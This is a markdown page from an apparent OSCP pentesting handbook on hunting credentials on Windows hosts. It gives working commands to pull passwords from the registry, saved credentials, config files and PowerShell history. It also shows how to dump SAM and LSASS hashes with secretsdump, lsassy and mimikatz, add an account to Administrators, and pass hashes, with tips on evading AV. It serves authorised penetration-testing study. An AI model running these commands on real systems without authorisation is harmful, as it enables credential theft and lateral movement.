---
title: "Windows Credential Hunting"
slug: windows-credential-hunting
category: notes
handbook: oscp
tags: ["credentials", "windows"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "Windows stores passwords in several places, some of them insecurely, and admins reuse them."
---
Windows stores passwords in several places, some of them insecurely, and admins reuse them. A recovered password or hash is often the cheapest escalation on the box. This is the Windows side of [Credential Hunting](/collections/oscp/credential-hunting) and covers the "credentials at rest" step of [Privilege Escalation (Windows)](/collections/oscp/privilege-escalation-windows). Any credential found is worth trying against other accounts and services.

## Registry

Programs and Windows itself leave passwords in the registry. Search broadly, then check the known locations:

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

The reliable hits:

```cmd
:: Autologon: DefaultUserName / DefaultPassword in cleartext
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Saved PuTTY sessions (proxy passwords, stored creds)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

## Saved Credentials

`runas` can run commands as another user with credentials saved on the system, without knowing the password. List saved credentials, then reuse them:

```cmd
cmdkey /list
runas /savecred /user:<admin> C:\Temp\reverse.exe
```

## Config Files

Installers and applications leave passwords in config files. `Unattend.xml` (automated-install answer file) is the classic:

```cmd
type C:\Windows\Panther\Unattend.xml
```

Its password is Base64 encoded, so decode rather than crack it (see [Base64 and Encodings](/collections/oscp/base64-and-encodings)):

```bash
echo "cGFzc3dvcmQxMjM=" | base64 -d
```

Search more widely for credentials in files:

```cmd
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt *.config
```

The PowerShell form sweeps every user profile for high-value file types in one line:

```powershell
Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.rar,*.zip,*.7z -File -Recurse -ErrorAction SilentlyContinue
```

`-Include` does nothing without `-Recurse` (or a wildcarded path), which is the usual reason it returns nothing. `-ErrorAction SilentlyContinue` swallows the access-denied errors on other users' profiles. Tune the extension list per box: `*.kdbx` is a KeePass database, and archives are often protected with a reused password worth a [Password Cracking](/collections/oscp/password-cracking) attempt. Medtech ran this as a standard user on CLIENT01 and it maps every document and archive on the box in one pass.

Other common homes: `web.config`, `sysprep.inf`, `sysprep.xml`, IIS `applicationHost.config`, and vendor app directories under `Program Files`.

## PowerShell History

PSReadLine saves every interactive PowerShell line to a per-user file, and past commands leak passwords that were typed inline. The current user's file needs no admin:

```powershell
(Get-PSReadlineOption).HistorySavePath
```

The default path is `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. `Get-Content` expands wildcards, so one line sweeps every profile the current context can read:

```powershell
Get-Content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Other users' files need admin, which makes this a post-exploitation pass as well: an Administrator shell reading every profile's history often hands over the next credential down the chain.

## SAM, SYSTEM and SECURITY Hives

Local password hashes live in the SAM, encrypted with a key in the SYSTEM hive. The SECURITY hive adds the LSA secrets: the machine account hash and the passwords services store in the registry. All three are locked while Windows runs, but backups of the first two are often readable:

- `C:\Windows\Repair\`
- `C:\Windows\System32\config\RegBack\`
- `C:\Windows.old\Windows\System32\`: a leftover previous install carries its own SAM and SYSTEM; its hashes belong to the account set as of that install and stay valid for any account unchanged since. Pull the files straight back with evil-winrm's `download`.

Otherwise export the live hives (see [Windows Token Privileges](/collections/oscp/windows-token-privileges) for `SeBackupPrivilege`):

```cmd
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
reg save hklm\security C:\Temp\security
```

`reg save` and `copy` are built-ins, so the SYSTEM shell a Potato lands saves all three with nothing uploaded and nothing for AV to flag. Move the files to Kali (SMB push: [File Transfers](/collections/oscp/file-transfers#exfiltrate-from-the-target)) and extract. `impacket-secretsdump` replaces the abandoned creddump7:

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

Three kinds of secret come out: local account NT hashes including the built-in Administrator (RID 500), the machine account hash as the `$MACHINE.ACC` entry, and LSA secrets where `_SC_<service>` lines are service account passwords in cleartext.

Each local-account line follows the pwdump shape `user:RID:LM:NT:::`:

```text
user:1001:aad3b435b51404eeaad3b435b51404ee:<32-hex>:::
```

The third field is the LM hash, and `aad3b435b51404eeaad3b435b51404ee` is its no-password placeholder, the normal state on modern Windows, so the NT hash is the fourth field. That is the value to use, on its own; feeding tools the full `LM:NT` pair gets rejected (Secura). Crack it (mode 1000) or pass it:

```bash
hashcat -m 1000 <nt-hash> /usr/share/wordlists/rockyou.txt
```

### From SYSTEM shell to remote dump

The bootstrap problem right after a PrintSpoofer or GodPotato escalation: the shell is admin or SYSTEM but no password or hash is in hand, and every remote dump tool (nxc, secretsdump, lsassy) needs an admin credential. Two ways to mint one from that shell, both ending in a dump that runs from Kali with mimikatz never going near the target:

**Promote a known-password account.** If an account whose password is already known exists on the box (the provided initial-access user, a recovered credential, or a fresh `net user <user> <pass> /add`), the admin shell puts it into the local Administrators group and the dump runs as that account, no hive step:

```cmd
net localgroup Administrators <user> /add
```

```bash
nxc smb TARGET -u <user> -p '<pass>' -M lsassy    # logged-on users, the on-host mimikatz equivalent
```

The catch is UAC remote filtering: a plain local account authenticates over the network but receives a filtered token, so the dump tools answer access denied. The promotion route needs a domain account (the usual case on a domain-joined box) or the built-in RID 500 Administrator. With an ordinary local account, fall back to the hive route.

**Or mint the hash from the hives.** One `reg save` pass produces the RID 500 Administrator hash (plus the machine account hash) without knowing any password:

```bash
nxc smb TARGET -u Administrator -H <hash> -M lsassy
```

`impacket-secretsdump` also takes the target directly ([Impacket](/collections/oscp/impacket#remote-sam-and-lsa-dump)). Two hashes authenticate the remote calls without knowing a password: the RID 500 Administrator hash, which is exempt from the UAC remote restriction that filters other local accounts over the network, and the `$MACHINE.ACC` hash, since the machine account sits in its own host's Administrators group and, as a domain principal, is not subject to that local-account filter either. With the machine hash the calls run as `-u 'HOST$' -H <hash>`.

## LSASS (live memory)

The richest source on a running host is LSASS, which caches the credentials of everyone currently logged on. With an admin credential in hand, dump it remotely with `nxc -M lsassy`, no binary on the target: [NetExec](/collections/oscp/netexec#dump-credentials-remotely). The credential does not need to be known in advance: the minting routes above produce one from a SYSTEM shell.

On-host alternatives: [Mimikatz](/collections/oscp/mimikatz) (`sekurlsa::logonpasswords`), or minidump LSASS and parse offline with `pypykatz`. Both still read LSASS and trip the same behavioural AV rule a live mimikatz does, so it is not an AV bypass. When AV blocks LSASS entirely, fall back to `--sam` / `--lsa` (disk/registry, no LSASS read). This is how a shell on a shared host yields another user's hash or a privileged session.

## Using Recovered Credentials or Hashes

A password and an NT hash reuse the same way: sweep for where the credential is admin, then execute (`nxc -x`, impacket-psexec/wmiexec, evil-winrm over WinRM, or `xfreerdp` for RDP). Commands and the pass-the-hash forms: [AD Lateral Movement](/collections/oscp/ad-lateral-movement#get-a-shell) and [NetExec](/collections/oscp/netexec#spraying-and-credential-reuse). Always retry a found credential across every account, since reuse is the whole premise.

## Checklist

- Registry: broad `reg query ... /f password`, then Winlogon autologon and PuTTY sessions.
- `cmdkey /list`, then `runas /savecred`.
- `Unattend.xml` and a `findstr` sweep for `password` in config files; decode Base64 values.
- PSReadLine history: `Get-Content C:\Users\*\AppData\...\PSReadLine\ConsoleHost_history.txt` for passwords typed inline; repeat from the Administrator shell.
- No admin credential after a Potato escalation: promote a known-password account into local Administrators (needs a domain account or RID 500), otherwise `reg save` the hives and mint the RID 500 hash. Either way the dumps run from Kali.
- SAM + SYSTEM + SECURITY (backups or `reg save` from the SYSTEM shell), `impacket-secretsdump ... LOCAL`: local hashes, machine account hash, service passwords. The recovered hash drives every further dump from Kali.
- LSASS for logged-on users: `nxc -M lsassy` from Kali first, on-host [Mimikatz](/collections/oscp/mimikatz) `sekurlsa::logonpasswords` only when a credential is already in hand and AV is out of the way.
- Reuse every credential everywhere before moving on.
